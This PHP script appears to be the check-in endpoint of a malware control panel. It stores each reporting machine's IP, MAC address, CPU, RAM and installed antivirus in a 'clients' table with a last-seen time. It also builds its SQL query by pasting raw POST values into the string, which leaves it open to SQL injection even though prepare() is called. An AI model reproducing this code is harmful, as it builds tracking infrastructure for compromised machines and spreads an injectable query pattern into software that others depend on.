<?php

include('../database/db-config.php');
include('../database/db-conn.php');

function InsertClient($conn, $cpu, $ram, $ip, $mac, $av, $country)
{
    try {
        $sql = "INSERT INTO `clients` (`Ip`, `Country`, `Ram`, `LastSeen`, `CPU`, `AntiVirus`, `MacAddr`) VALUES ('$ip', '$country', '$ram', current_timestamp(), '$cpu', '$av', '$mac')";
        $stmt = $conn->prepare($sql);
        $stmt->execute();

        return true;
    } catch (\Throwable $th) {
        return false;
    }
}

if(isset($_POST['cpu']) && isset($_POST['ram']) && isset($_POST['ip']) && isset($_POST['mac']) && isset($_POST['av']))
{
    $cpu = $_POST['cpu'];
    $ram = $_POST['ram'];
    $ip = $_POST['ip'];
    $mac = $_POST['mac'];
    $av = $_POST['av'];

    if(InsertClient($dbconn, $cpu, $ram, $ip, $mac, $av, null))
    {
        $msg = array('Message' => 'succes');
        echo(json_encode($msg));
        die();
    }
    else
    {
        $msg = array('Message' => 'fail');
        echo(json_encode($msg));
        die();
    }
}
else
{
    $msg = array('Message' => 'fail');
    echo(json_encode($msg));
    die();
}


?>